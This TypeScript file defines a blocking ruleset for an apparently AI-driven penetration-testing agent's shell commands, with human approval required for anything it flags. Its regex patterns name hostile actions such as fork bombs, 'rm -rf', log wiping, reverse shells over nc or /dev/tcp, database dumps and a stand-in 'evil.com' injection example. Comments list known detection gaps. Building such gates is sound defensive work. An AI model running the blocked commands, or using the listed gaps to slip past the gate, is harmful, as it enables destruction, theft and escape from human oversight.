/**
 * The red-lines ruleset (Architecture §10.4) as data.
 *
 * §10.4's list is "settled" — seven categories of prohibited action, blocked
 * outright until Chaitanya explicitly approves, a strictly higher bar than the
 * validated-finding or submission gates. This file encodes them as a flat,
 * declared ruleset so categories/patterns extend without touching the
 * enforcement path (check.ts) or the hook (index.ts) — exactly the
 * data-driven shape the cybersecurity-modules skill calls for.
 *
 * Failure direction: a red-line is a SAFETY gate, so the rules lean toward
 * blocking. A false positive merely means the human is asked to approve
 * (§10.4's whole model); a false negative means a prohibited action ran. When
 * in doubt, a rule fires. The reasoning core's broad shell access is
 * intentional (§2.3) — safety lives here and in the gates, not in withholding
 * tools.
 */

export type RedLineCategory =
	| "denial_of_service"
	| "out_of_scope_scanning"
	| "self_propagation"
	| "false_flag_or_evidence_tampering"
	| "safety_of_life_systems"
	| "destructive_or_irreversible"
	| "sensitive_data_exfiltration";

/** A proposed tool invocation, normalized for inspection. */
export interface ToolInvocation {
	toolName: string;
	input: unknown;
	/** Text to scan: the bash command, or JSON of the input for other tools. */
	commandText: string;
}

export interface RedLineContext {
	/** Allowed hosts for the current engagement (target host + parsed
	 * scope_notes + PLUTO_SCOPE_HOSTS), normalized. Empty = scope undefined,
	 * in which case the scope rule cannot enforce and does not fire. */
	scopeHosts: Set<string>;
}

export interface RedLineRule {
	id: string;
	category: RedLineCategory;
	description: string;
	/** Returns a human-readable reason if this rule fires, else null. */
	evaluate(inv: ToolInvocation, ctx: RedLineContext): string | null;
}

// --- host extraction / scope helpers -------------------------------------

const LOOPBACK = new Set(["localhost", "127.0.0.1", "::1", "0.0.0.0"]);

/** Canonicalize a host so loopback aliases compare equal. */
export function normalizeHost(host: string): string {
	const h = host.trim().toLowerCase().replace(/^\[|\]$/g, "");
	return LOOPBACK.has(h) ? "localhost" : h;
}

function validIpv4(candidate: string): boolean {
	const parts = candidate.split(".");
	return parts.length === 4 && parts.every((p) => /^\d{1,3}$/.test(p) && Number(p) <= 255);
}

/** A host token only means something to a static scope check if it is a clean
 * literal. Shell variables (`$VAR`, `${VAR}`), command substitution (`` `…` ``,
 * `$(…)`) and globs mean the real host is only known once the shell expands it,
 * so keep the literal prefix and drop the rest: `10.129.2.155$path` scope-checks
 * as `10.129.2.155` (its in-scope base), and a token that *starts* with a
 * variable (`${TARGET}`) yields nothing to check rather than a bogus host that
 * would falsely block a legitimate recon loop. */
export function literalHostPrefix(host: string): string | null {
	const cut = host.search(/[$`(){}*?\\]/);
	const literal = (cut === -1 ? host : host.slice(0, cut)).trim();
	return literal.length > 0 ? literal : null;
}

/** Extract candidate target hosts (IPv4 + URL hostnames) from command text. */
export function extractHosts(text: string): string[] {
	const hosts = new Set<string>();

	for (const m of text.matchAll(/https?:\/\/[^\s'"`|<>]+/gi)) {
		try {
			const h = literalHostPrefix(new URL(m[0]).hostname);
			if (h) hosts.add(h);
		} catch {
			// not a parseable URL; ignore
		}
	}
	for (const m of text.matchAll(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g)) {
		if (validIpv4(m[0])) {
			hosts.add(m[0]);
		}
	}
	// DEFENSE-IN-DEPTH ONLY (not an authoritative egress control — that must be a
	// network-level allowlist; see the scope rule + docs). This catches the
	// EXFIL/PIVOT SHAPES a prompt-injection would use without an http(s):// URL,
	// while deliberately NOT extracting hosts from ordinary tool fetches
	// (`pip install`, `git clone`, `curl https://github.com/tool`) so it does not
	// false-block legitimate tooling. Known gaps it does NOT close (need egress
	// control): IPv6 literals, DNS-tunnel via dig/nslookup, cross-call variable
	// indirection (`H=evil.com; nc $H …`), base64/pipe-to-shell.

	// Raw-socket tool target (reverse shell / pivot): first non-flag arg, bare
	// single-label or dotted. Its first argument IS the host, so this is precise.
	for (const m of text.matchAll(/\b(?:nc|ncat|netcat|telnet|socat)\s+(?:-\S+\s+)*([a-z][a-z0-9.-]*)\b/gi)) {
		const h = m[1] && literalHostPrefix(m[1]);
		if (h && !validIpv4(h)) hosts.add(normalizeHost(h));
	}
	// NOTE: scheme-less `curl evil.com -d @file` exfil is deliberately NOT parsed
	// here — distinguishing the curl TARGET from a host inside a `-d` data body
	// (e.g. an email address) is not reliable with text parsing and caused false
	// blocks. It is a documented gap for the network-egress allowlist to close.

	// user@host — ONLY as an ssh/scp/sftp/rsync pivot target, so ordinary email
	// addresses in request bodies / commit messages do not false-block.
	for (const m of text.matchAll(/\b(?:ssh|scp|sftp|rsync)\b[^|;&]*?[a-z0-9._%+-]+@([a-z0-9-]+(?:\.[a-z0-9-]+)+)/gi)) {
		const h = m[1] && literalHostPrefix(m[1]);
		if (h && !validIpv4(h)) hosts.add(normalizeHost(h));
	}
	// /dev/tcp|udp/host reverse shell.
	for (const m of text.matchAll(/\/dev\/(?:tcp|udp)\/([a-z0-9.-]+)\//gi)) {
		const h = m[1] && literalHostPrefix(m[1]);
		if (h && !validIpv4(h)) hosts.add(normalizeHost(h));
	}
	return [...hosts];
}

/** Expand scope to include vhosts. A hostname that `/etc/hosts` maps to an
 * already-in-scope IP is itself in scope — a virtual host is only a `Host:`
 * header sent to the very same in-scope machine, never a different target. So
 * once recon adds `10.129.2.155 management.htb` (the standard HTB workflow),
 * requests to `management.htb` must not be blocked as out-of-scope. Only names
 * pointing at an in-scope IP are added; a name mapping to any other IP is left
 * out, so this never widens scope to a different host. Pure: takes the file
 * content so it is unit-testable without touching the filesystem. */
export function resolveVhosts(hosts: Set<string>, etcHostsContent: string): void {
	for (const raw of etcHostsContent.split("\n")) {
		const line = raw.replace(/#.*$/, "").trim();
		if (!line) continue;
		const [ip, ...names] = line.split(/\s+/);
		if (!ip || !hosts.has(normalizeHost(ip))) continue; // only vhosts on an in-scope IP
		for (const n of names) hosts.add(normalizeHost(n));
	}
}

/** Parse an allowlist of hosts/IPs out of free-text scope notes or a
 * comma/space list. Session 8.4/11 will formalize scope_notes; for now this
 * pulls IPv4s and dotted hostnames plus the loopback keyword. */
export function parseScopeHosts(raw: string | null | undefined): string[] {
	if (!raw) return [];
	const hosts = new Set<string>();
	for (const m of raw.matchAll(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g)) {
		if (validIpv4(m[0])) hosts.add(normalizeHost(m[0]));
	}
	for (const m of raw.matchAll(/\b[a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)+\b/gi)) {
		hosts.add(normalizeHost(m[0]));
	}
	if (/\blocalhost\b/i.test(raw)) hosts.add("localhost");
	return [...hosts];
}

// --- pattern rules -------------------------------------------------------

interface PatternRuleSpec {
	id: string;
	category: RedLineCategory;
	description: string;
	patterns: RegExp[];
	reason: string;
}

function patternRule(spec: PatternRuleSpec): RedLineRule {
	return {
		id: spec.id,
		category: spec.category,
		description: spec.description,
		evaluate(inv) {
			for (const p of spec.patterns) {
				if (p.test(inv.commandText)) {
					return `${spec.reason} (matched /${p.source}/)`;
				}
			}
			return null;
		},
	};
}

const DOS_RULE = patternRule({
	id: "dos-flood",
	category: "denial_of_service",
	description: "Flooding / resource-exhaustion / availability-degrading actions.",
	reason: "Denial-of-service: primary effect is degrading availability, not testing it",
	patterns: [
		/\bhping3?\b[^\n]*--flood/i,
		/\bslowloris\b/i,
		/\bt50\b/i,
		/\bgoldeneye\b/i,
		/\b(mhddos|hulk|loic|xerxes)\b/i,
		/\bnmap\b[^\n]*--min-rate\s*([1-9]\d{4,})/i, // --min-rate >= 10000
		/\bab\b[^\n]*-n\s*([1-9]\d{5,})/i, // apachebench -n >= 100000
		/:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/, // fork bomb
		/\bstress(-ng)?\b/i,
	],
});

const SELF_PROPAGATION_RULE = patternRule({
	id: "self-propagation",
	category: "self_propagation",
	description: "Unattended spread beyond the aimed host without human re-approval per hop.",
	reason: "Unattended self-propagation: would spread tooling/payload beyond the target host",
	patterns: [
		/for\s+\w+\s+in\s+.*;\s*do\s+.*\bssh\b.*done/is,
		/\bfor\b.*\bin\b.*\$\(.*(shodan|masscan|nmap).*\).*\bdo\b/is,
		/\b(psexec|wmiexec|crackmapexec|cme)\b[^\n]*@?\S+\/\d{1,2}\b/i, // subnet spray
		/\bansible\b[^\n]*-i\s+\S+,?\S*/i,
	],
});

const FALSE_FLAG_RULE = patternRule({
	id: "false-flag-or-tampering",
	category: "false_flag_or_evidence_tampering",
	description: "Forging attack attribution, or falsifying/destroying the target's own evidence.",
	reason: "False-flag or evidence tampering: forging indicators or altering the target's logs",
	patterns: [
		/\bnmap\b[^\n]*\s-S\s+\S+/i, // spoofed source IP
		/\bhping3?\b[^\n]*(--spoof|-a\s+\S+)/i,
		/\bwevtutil\b\s+cl\b/i, // clear Windows event log
		/\bClear-EventLog\b/i,
		/\b(rm|shred|truncate)\b[^\n]*\/var\/log/i,
		/>\s*\/var\/log\/\S+/i,
		/\blastlog\b[^\n]*>\s*\/dev\/null/i,
		/\bunset\s+HISTFILE\b|\bhistory\s+-c\b/i,
	],
});

const SAFETY_OF_LIFE_RULE: RedLineRule = {
	id: "safety-of-life",
	category: "safety_of_life_systems",
	description:
		"Any action against safety-of-life target classes (medical, ICS/SCADA, emergency services), regardless of nominal scope.",
	evaluate(inv) {
		// Heuristic: ICS/SCADA/medical protocol tooling or well-known OT ports.
		const patterns: RegExp[] = [
			/\b(modbus|bacnet|dnp3|s7comm|profinet|ethernet\/ip|hl7|dicom)\b/i,
			/\b(plcscan|modbus-cli|mbtget|opcua)\b/i,
			// OT/ICS ports, but ONLY in a real PORT position (-p / --port / :port) —
			// not a bare integer, so `sleep 502`, `head -n 20000`, `.../102/` do
			// not trip this highest-priority, scope-independent block.
			/(?:-p\s*|--port[=\s]|:)(?:502|20000|47808|44818|2404|102)\b/i,
		];
		for (const p of patterns) {
			if (p.test(inv.commandText)) {
				return `Possible safety-of-life / OT system target (matched /${p.source}/); blocked regardless of scope`;
			}
		}
		return null;
	},
};

const DESTRUCTIVE_RULE = patternRule({
	id: "destructive-irreversible",
	category: "destructive_or_irreversible",
	description: "Data deletion, encryption, disabling security controls, or actions without documented rollback.",
	reason: "Destructive or irreversible action on the target",
	patterns: [
		/\brm\s+-[rfRimd]*f[rfRimd]*\s+(\/|~|\*)/i, // rm -rf on a root-ish path
		/\bmkfs(\.\w+)?\b/i,
		/\bdd\b[^\n]*\bof=\/dev\/(sd|nvme|vd|hd)\w+/i,
		/\b(shred|wipe)\b/i,
		/\bDROP\s+(TABLE|DATABASE|SCHEMA)\b/i,
		/\bTRUNCATE\s+TABLE\b/i,
		/\bDELETE\s+FROM\b(?![^\n]*\bWHERE\b)/i, // DELETE without WHERE
		/\bUPDATE\b[^\n]+\bSET\b(?![^\n]*\bWHERE\b)/i, // UPDATE without WHERE
		/\biptables\b[^\n]*-F\b/i,
		/\bsystemctl\b[^\n]*\bstop\b[^\n]*(firewalld|ufw|auditd)/i,
		/\bsetenforce\s+0\b/i,
		/\b(vssadmin|wbadmin)\b[^\n]*\bdelete\b/i, // shadow-copy deletion (ransomware pattern)
	],
});

const EXFIL_RULE = patternRule({
	id: "sensitive-data-exfiltration",
	category: "sensitive_data_exfiltration",
	description: "Bulk harvesting/retention of real sensitive data beyond evidence needs — prove access, don't harvest.",
	reason: "Sensitive-data exfiltration: bulk-dumping/retaining real data beyond evidence needs",
	patterns: [
		/\bsqlmap\b[^\n]*--dump-all/i,
		/\bsqlmap\b[^\n]*--dump\b(?![^\n]*--start)/i, // whole-table dump (no bounding)
		/\bmysqldump\b[^\n]*--all-databases/i,
		/\bpg_dumpall\b/i,
		/\bmongodump\b[^\n]*(--out|--archive)/i,
		/\b(scp|rsync)\b[^\n]*\/(etc\/shadow|etc\/passwd|home)\b/i,
		/\btar\b[^\n]*(\/home|\/var\/mail|\/etc)\b[^\n]*\|\s*(nc|curl|ssh)\b/i,
	],
});

const OUT_OF_SCOPE_RULE: RedLineRule = {
	id: "out-of-scope-scanning",
	category: "out_of_scope_scanning",
	description: "Scanning/targeting a host outside targets.scope_notes for the current engagement.",
	evaluate(inv, ctx) {
		if (ctx.scopeHosts.size === 0) {
			return null; // scope undefined; cannot enforce (documented edge)
		}
		for (const host of extractHosts(inv.commandText)) {
			if (!ctx.scopeHosts.has(normalizeHost(host))) {
				return `Out-of-scope target '${host}': not in engagement scope {${[...ctx.scopeHosts].join(", ")}}`;
			}
		}
		return null;
	},
};

/** The full ruleset, evaluated in order; the first match blocks. */
export const RED_LINE_RULES: readonly RedLineRule[] = [
	SAFETY_OF_LIFE_RULE, // highest priority — blocks regardless of scope
	OUT_OF_SCOPE_RULE,
	DOS_RULE,
	SELF_PROPAGATION_RULE,
	FALSE_FLAG_RULE,
	DESTRUCTIVE_RULE,
	EXFIL_RULE,
];
